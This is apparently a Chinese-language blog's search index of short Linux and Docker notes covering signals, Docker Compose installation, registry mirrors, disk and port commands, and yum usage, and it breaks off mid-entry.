    
    
    <entry>
      <title>Linux信号机制与信号处理</title>
      <link href="/post/linux-signal.html"/>
      <url>/post/linux-signal.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux信号机制与信号处理"><a href="#Linux信号机制与信号处理" class="headerlink" title="Linux信号机制与信号处理"></a>Linux信号机制与信号处理</h2><p>信号(signal)是Linux进程间通信的一种机制，全称为软中断信号，也被称为软中断。信号本质上是在软件层次上对硬件中断机制的一种模拟。</p><h3 id="常见信号"><a href="#常见信号" class="headerlink" title="常见信号"></a>常见信号</h3><p><img src="/images/QQ20161114-0@2x.jpg"><br>每种信号都会有一个默认动作。默认动作就是脚本或程序接收到该信号所做出的默认操作。常见的默认动作有终止进程、退出程序、忽略信号、重启暂停的进程等，上表中也对部分默认动作进行了说明。</p><h3 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h3><p>有多种方式可以向程序或脚本发送信号，例如按下<code>&lt;Ctrl+C&gt;</code>组合键会发送<code>SIGINT</code>信号，终止当前进程。</p><p>还可以通过 kill 命令发送信号，语法为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -signal pid</span><br></pre></td></tr></table></figure><p>signal为要发送的信号，可以是信号名称或数字；pid为接收信号的进程ID。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -2 1001</span><br></pre></td></tr></table></figure><p>将<code>SIGINT</code>信号发送给进程ID为1001的程序，程序会终止执行。</p><blockquote><p>kill的默认信号为<code>SIGTERM</code>15</p></blockquote><h3 id="捕获信号"><a href="#捕获信号" class="headerlink" title="捕获信号"></a>捕获信号</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;pid: %d&#x27;</span>, process.<span class="property">pid</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>()), <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;SIGHUP&#x27;</span>, <span class="string">&#x27;SIGINT&#x27;</span>, <span class="string">&#x27;SIGQUIT&#x27;</span>, <span class="string">&#x27;SIGFPE&#x27;</span>, <span class="string">&#x27;SIGALRM&#x27;</span>, <span class="string">&#x27;SIGTERM&#x27;</span>].<span class="title function_">forEach</span>(<span class="function">(<span class="params">signal</span>) =&gt;</span> &#123;</span><br><span class="line">    process.<span class="title function_">on</span>(signal, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(signal);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>如果在程序中捕获了信号，没有做退出处理，程序是不会退出的。可以在捕获信号后做一下清理工作然后退出。<br>如果需要退出，需要手动调用<code>process.exit(0)</code>。<em>（非0代表异常退出）</em><br><code>SIGKILL</code>信号无法监听，无法被进程捕获，进程会立即退出。<strong>慎用kill -9</strong></p></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ol><li><p>使用<code>kill -0</code>检查进程</p><p> <code>kill -0</code>不会给进程发送任何信号，但是仍会检查进程是否存在。如果进程存在返回0，不存在返回1。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">kill</span> -0 <span class="variable">$BASHPID</span> 2&gt;/dev/null; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;process <span class="variable">$BASHPID</span> existence&quot;</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;process <span class="variable">$BASHPID</span> nexistence&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://c.biancheng.net/cpp/html/2784.html">Linux信号机制与信号处理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kill </tag>
            
            <tag> signal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install-Docker-Compose</title>
      <link href="/post/Install-Docker-Compose.html"/>
      <url>/post/Install-Docker-Compose.html</url>
      
        <content type="html"><![CDATA[<h3 id="Install-Docker-Compose"><a href="#Install-Docker-Compose" class="headerlink" title="Install Docker Compose"></a>Install Docker Compose</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L &quot;https://github.com/docker/compose/releases/download/1.8.1/docker-compose-$(uname -s)-$(uname -m)&quot; &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://docs.docker.com/compose/install/">【1】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenResty总结</title>
      <link href="/post/openresty.html"/>
      <url>/post/openresty.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://gist.github.com/tianyk/e50ba80444cd114962493589a9efd3fa">https://gist.github.com/tianyk/e50ba80444cd114962493589a9efd3fa</a></li><li><a href="http://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API">http://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API</a></li><li><a href="http://www.londonlua.org/scripting_nginx_with_lua/slides.html">http://www.londonlua.org/scripting_nginx_with_lua/slides.html</a></li><li><a href="https://github.com/iresty/nginx-lua-module-zh-wiki">https://github.com/iresty/nginx-lua-module-zh-wiki</a></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   ├── openresty</span><br><span class="line">├── COPYRIGHT</span><br><span class="line">├── lua/                                                # 项目lua代码</span><br><span class="line">│   └── auth.lua</span><br><span class="line">├── luajit/                                             # luajit</span><br><span class="line">├── lualib/                                             # lua 第三方模块</span><br><span class="line">│   ├── nginx-jwt.lua</span><br><span class="line">│   ├── ngx                                             # ngx lua 模块</span><br><span class="line">│   │   ├── balancer.lua</span><br><span class="line">│   │   └── ...</span><br><span class="line">│   └── resty                                           # openresty 第三方模块</span><br><span class="line">│       ├── memcached.lua</span><br><span class="line">│       ├── ...</span><br><span class="line">├── nginx/                                              # nginx</span><br><span class="line">├── openssl/</span><br><span class="line">├── pcre/</span><br><span class="line">├── site/</span><br><span class="line">└── zlib/</span><br></pre></td></tr></table></figure><p><img src="/images/openresty_phases.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>阿里云docker镜像加速</title>
      <link href="/post/docker-aliyun-registrymirror.html"/>
      <url>/post/docker-aliyun-registrymirror.html</url>
      
        <content type="html"><![CDATA[<h3 id="阿里云Docker镜像加速"><a href="#阿里云Docker镜像加速" class="headerlink" title="阿里云Docker镜像加速"></a>阿里云Docker镜像加速</h3><h4 id="注册私人镜像"><a href="#注册私人镜像" class="headerlink" title="注册私人镜像"></a>注册私人镜像</h4><p><a href="http://mirror.aliyun.com/">镜像加速</a><br><img src="/images/%E9%98%BF%E9%87%8C%E4%BA%91Docker%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F.jpeg"></p><h4 id="配置加速器"><a href="#配置加速器" class="headerlink" title="配置加速器"></a>配置加速器</h4><ol><li>Ubuntu</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;DOCKER_OPTS=\&quot;\$DOCKER_OPTS --registry-mirror=你的镜像加速地址\&quot;&quot; | sudo tee -a /etc/default/docker</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><ol start="2"><li>Centos</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &#x27;s|OPTIONS=|OPTIONS=--registry-mirror=你的镜像加速地址|g&#x27; /etc/sysconfig/docker</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://baichuan.taobao.com/doc2/detail.htm?treeId=39&articleId=103049&docType=1">【1】</a><br><a href="https://cr.console.aliyun.com/#/accelerator">【加速器】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker的镜像存放目录修改与迁移</title>
      <link href="/post/docker-image-store.html"/>
      <url>/post/docker-image-store.html</url>
      
        <content type="html"><![CDATA[<h3 id="Docker的镜像存放目录修改与迁移"><a href="#Docker的镜像存放目录修改与迁移" class="headerlink" title="Docker的镜像存放目录修改与迁移"></a>Docker的镜像存放目录修改与迁移</h3><p>Docker镜像默认存放在<code>/var/lib/docker</code>，有些情况下由于系统盘空间不够需要将镜像迁移到其他磁盘。</p><h4 id="软连接形式"><a href="#软连接形式" class="headerlink" title="软连接形式"></a>软连接形式</h4><ol><li>停止服务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker stop</span><br></pre></td></tr></table></figure><ol start="2"><li>移动<code>/var/lib/docker</code>到新目录<code>/data/</code>下</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /var/lib/docker /data/</span><br></pre></td></tr></table></figure><ol start="3"><li>重新将<code>/var/lib/docker</code>链接到<code>/data/docker</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /data/docker /var/lib/docker</span><br></pre></td></tr></table></figure><ol start="4"><li>重启服务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h4 id="设置DOCKER-PATH环境变量方式"><a href="#设置DOCKER-PATH环境变量方式" class="headerlink" title="设置DOCKER_PATH环境变量方式"></a>设置<code>DOCKER_PATH</code>环境变量方式</h4><p>参考<a href="https://my.oschina.net/u/2306127/blog/653569">《Docker的镜像存放目录修改与迁移》</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-常用命令</title>
      <link href="/post/linux-command.html"/>
      <url>/post/linux-command.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linux-常用命令"><a href="#Linux-常用命令" class="headerlink" title="Linux 常用命令"></a>Linux 常用命令</h3><h4 id="查看文件夹大小"><a href="#查看文件夹大小" class="headerlink" title="查看文件夹大小"></a>查看文件夹大小</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">du -h --max-depth=1 ~/</span><br><span class="line">du -h -d=1 .</span><br><span class="line"></span><br><span class="line">du -sh file_path</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--max-depth为深度</span><br><span class="line"></span><br><span class="line">-s, --summarize</span><br><span class="line">    display only a total for each argument</span><br><span class="line"></span><br><span class="line">-h, --human-readable</span><br><span class="line">    print sizes in human readable format (e.g., 1K 234M 2G)</span><br><span class="line"></span><br><span class="line">To check more than one directory and see the total, use du -sch:</span><br><span class="line">-c, --total</span><br><span class="line">    produce a grand total</span><br></pre></td></tr></table></figure><ul><li><a href="https://unix.stackexchange.com/questions/185764/how-do-i-get-the-size-of-a-directory-on-the-command-line">How do I get the size of a directory on the command line?</a></li></ul><h4 id="查看磁盘使用情况"><a href="#查看磁盘使用情况" class="headerlink" title="查看磁盘使用情况"></a>查看磁盘使用情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure><h4 id="查看inode使用情况"><a href="#查看inode使用情况" class="headerlink" title="查看inode使用情况"></a>查看inode使用情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -i</span><br></pre></td></tr></table></figure><h4 id="列出文件"><a href="#列出文件" class="headerlink" title="列出文件"></a>列出文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. ls -p | grep -v /                                   (without hidden files)</span><br><span class="line">2. ls -l | grep ^- | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f 9       (without hidden files)</span><br><span class="line"></span><br><span class="line">a) ls -pa | grep -v /                                  (with hidden files)</span><br><span class="line">b) ls -la | grep ^- | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f        (with hidden files)</span><br></pre></td></tr></table></figure><p>List directories only:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. ls -p | grep /                                      (without hidden)</span><br><span class="line">2. ls -l | grep ^d | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f 9       (without hidden)</span><br><span class="line"></span><br><span class="line">a) ls -pa | grep /                                     (with hidden)</span><br><span class="line">b) ls -l | grep ^d | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f 9       (with hidden)</span><br></pre></td></tr></table></figure><p>grep -v -e ^$ is to remove blank lines from the result.</p><h4 id="Argument-list-too-long-错误"><a href="#Argument-list-too-long-错误" class="headerlink" title="Argument list too long 错误"></a>Argument list too long 错误</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find src -name &#x27;*.*&#x27; -exec mv &#123;&#125; dest \;</span><br></pre></td></tr></table></figure><h4 id="查看内核及发行版"><a href="#查看内核及发行版" class="headerlink" title="查看内核及发行版"></a>查看内核及发行版</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><h4 id="文件分割"><a href="#文件分割" class="headerlink" title="文件分割"></a>文件分割</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">split [-bl] file [prefix]  </span><br><span class="line">-b, --bytes=SIZE：对file进行切分，每个小文件大小为SIZE。可以指定单位b,k,m。</span><br><span class="line">-C, --line-bytes=SIZE   设置输出文件的最大行数。与 -b 类似，但会尽量维持每行的完整性</span><br><span class="line">-l, --lines=NUMBER：对file进行切分，每个文件有NUMBER行。</span><br><span class="line">-a, --suffix-length=N   使用长度为 N 的后缀 (默认 2)</span><br><span class="line">-d, --numeric-suffixes  使用数字后缀代替字母</span><br><span class="line">prefix：分割后产生的文件名前缀。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每1000行切割成一个文件</span></span><br><span class="line">split -l 1000 urls.txt url_</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每100M切割成一个文件，使用数字作为后缀，后缀长度4位</span></span><br><span class="line">split es.tar.gz -b 100m -a 4 -d es.tar.gz_</span><br></pre></td></tr></table></figure><h4 id="读取文件N行"><a href="#读取文件N行" class="headerlink" title="读取文件N行"></a>读取文件N行</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二行到最后一行</span></span><br><span class="line">sed -n &#x27;2,$p&#x27; file</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二行到第100行</span></span><br><span class="line">sed -n &#x27;2,100p&#x27; file</span><br></pre></td></tr></table></figure><h4 id="echo-输出转义字符"><a href="#echo-输出转义字符" class="headerlink" title="echo 输出转义字符"></a>echo 输出转义字符</h4><p>默认<code>echo</code>的输出是不转义的。使用<code>-e</code>可以实现转义。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;第一行\n第二行&quot;</span><br></pre></td></tr></table></figure><h4 id="查找和删除失效的软链接"><a href="#查找和删除失效的软链接" class="headerlink" title="查找和删除失效的软链接"></a>查找和删除失效的软链接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查找当前目录</span><br><span class="line">find -L -type l</span><br><span class="line">复制代码</span><br><span class="line">查找指定目录</span><br><span class="line">find -L ur_path -type l</span><br><span class="line">复制代码</span><br><span class="line">删除</span><br><span class="line">find -L ur_path -type l -delete</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h4 id="查看文件编码"><a href="#查看文件编码" class="headerlink" title="查看文件编码"></a>查看文件编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file --mime-encoding [filename]</span><br></pre></td></tr></table></figure><h4 id="生成指定大小文件"><a href="#生成指定大小文件" class="headerlink" title="生成指定大小文件"></a>生成指定大小文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate -s 50M 50M.file</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=50M.file bs=1M count=50</span><br></pre></td></tr></table></figure><h4 id="网卡流量分析"><a href="#网卡流量分析" class="headerlink" title="网卡流量分析"></a>网卡流量分析</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sar -n DEV 2 10 每2秒刷新一次，共10次</span><br></pre></td></tr></table></figure><h4 id="宽口使用查看"><a href="#宽口使用查看" class="headerlink" title="宽口使用查看"></a>宽口使用查看</h4><p><a href="/2016/11/08/linux-%E7%AB%AF%E5%8F%A3/">linux 端口</a></p><h4 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">PID=$$ # $BASHPID</span><br><span class="line"></span><br><span class="line">if kill -0 $PID 2&gt;/dev/null; then </span><br><span class="line">    echo &quot;process $PID existence&quot; </span><br><span class="line">else </span><br><span class="line">    echo &quot;process $PID nexistence&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="fuser"><a href="#fuser" class="headerlink" title="fuser"></a>fuser</h4><p>fuser 1080&#x2F;tcp<br>fuser -k 1080&#x2F;tcp<br>fkill</p><h4 id="pidstat"><a href="#pidstat" class="headerlink" title="pidstat"></a>pidstat</h4><h4 id="测试磁盘IO"><a href="#测试磁盘IO" class="headerlink" title="测试磁盘IO"></a>测试磁盘IO</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux-端口</title>
      <link href="/post/linux-port-command.html"/>
      <url>/post/linux-port-command.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linux平台查看端口占用情况"><a href="#Linux平台查看端口占用情况" class="headerlink" title="Linux平台查看端口占用情况"></a>Linux平台查看端口占用情况</h3><ol><li><p><code>netstat -nlp | grep :80</code></p></li><li><p><code>lsof -i :80 | grep LISTEN</code><br> <code>yum install lsof</code></p></li><li><p><code>fuser 8080/tcp</code><br> <code>fuser -k 8080/tcp</code> 会杀死这个进程</p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://unix.stackexchange.com/questions/106561/finding-the-pid-of-the-process-using-a-specific-port">Finding the PID of the process using a specific port?</a></li><li><a href="https://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux">How to kill a process running on particular port in Linux?</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>yum.md</title>
      <link href="/post/yum.html"/>
      <url>/post/yum.html</url>
      
        <content type="html"><![CDATA[<h3 id="YUM"><a href="#YUM" class="headerlink" title="YUM"></a>YUM</h3><p>yum命令软件包管理 yum命令是在Fedora和RedHat以及SUSE中基于rpm的软件包管理器，它可以使系统管理人员交互和自动化地更细与管理RPM软件包，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum (选项) (参数)</span><br></pre></td></tr></table></figure><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-h：显示帮助信息；</span><br><span class="line">-y：对所有的提问都回答“yes”；</span><br><span class="line">-c：指定配置文件；</span><br><span class="line">-q：安静模式；</span><br><span class="line">-v：详细模式；</span><br><span class="line">-d：设置调试等级（0-10）；</span><br><span class="line">-e：设置错误等级（0-10）；</span><br><span class="line">-R：设置yum处理一个命令的最大等待时间；</span><br><span class="line">-C：完全从缓存中运行，而不去下载或者更新任何头文件</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">install：安装rpm软件包；</span><br><span class="line">update：更新rpm软件包；</span><br><span class="line">check-update：检查是否有可用的更新rpm软件包；</span><br><span class="line">remove：删除指定的rpm软件包；</span><br><span class="line">list：显示软件包的信息；</span><br><span class="line">search：检查软件包的信息；</span><br><span class="line">info：显示指定的rpm软件包的描述信息和概要信息；</span><br><span class="line">clean：清理yum过期的缓存；</span><br><span class="line">makecache：生成缓存；</span><br><span class="line">shell：进入yum的shell提示符；</span><br><span class="line">resolvedep：显示rpm软件包的依赖关系；</span><br><span class="line">localinstall：安装本地的rpm软件包；</span><br><span class="line">localupdate：显示本地rpm软件包进行更新；</span><br><span class="line">deplist：显示rpm软件包的所有依赖关系。</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install #全部安装</span><br><span class="line">yum install package1 #安装指定的安装包package1</span><br><span class="line">yum groupinsall group1 #安装程序组group1</span><br></pre></td></tr></table></figure><h4 id="更新和升级"><a href="#更新和升级" class="headerlink" title="更新和升级"></a>更新和升级</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum update #全部更新</span><br><span class="line">yum update package1 #更新指定程序包package1</span><br><span class="line">yum check-update #检查可更新的程序</span><br><span class="line">yum upgrade package1 #升级指定程序包package1</span><br><span class="line">yum groupupdate group1 #升级程序组group1</span><br></pre></td></tr></table></figure><h4 id="查找和显示"><a href="#查找和显示" class="headerlink" title="查找和显示"></a>查找和显示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum info package1 #显示安装包信息package1</span><br><span class="line">yum list #显示所有已经安装和可以安装的程序包</span><br><span class="line">yum list package1 #显示指定程序包安装情况package1</span><br><span class="line">yum groupinfo group1 #显示程序组group1信息</span><br><span class="line">yum search string #根据关键字string查找安装包</span><br></pre></td></tr></table></figure><h4 id="删除程序"><a href="#删除程序" class="headerlink" title="删除程序"></a>删除程序</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum remove package1 #删除程序包package1</span><br><span class="line">yum groupremove group1 #删除程序组group1</span><br><span class="line">yum deplist package1 #查看程序package1依赖情况 清除缓存</span><br><span class="line">yum clean packages #清除缓存目录下的软件包</span><br><span class="line">yum clean headers #清除缓存目录下的 headers</span><br><span class="line">yum clean oldheaders #清除缓存目录下旧的 headers</span><br></pre></td></tr></table></figure><h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum clean packages #清除缓存目录下的软件包</span><br><span class="line">yum clean headers #清除缓存目录下的 headers</span><br><span class="line">yum clean oldheaders #清除缓存目录下旧的 headers</span><br></pre></td></tr></table></figure><h3 id="仅下载"><a href="#仅下载" class="headerlink" title="仅下载"></a>仅下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --downloadonly --downloaddir=. install  java-1.8.0-openjdk  java-1.8.0-openjdk-devel -y</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已安装时</span></span><br><span class="line">yum --downloadonly --downloaddir=. reinstall package_name -y</span><br></pre></td></tr></table></figure><h3 id="配置源"><a href="#配置源" class="headerlink" title="配置源"></a>配置源</h3><h4 id="配置阿里源"><a href="#配置阿里源" class="headerlink" title="配置阿里源"></a>配置阿里源</h4><p>1、备份</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure><p>2、下载新的CentOS-Base.repo 到&#x2F;etc&#x2F;yum.repos.d&#x2F; CentOS 5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 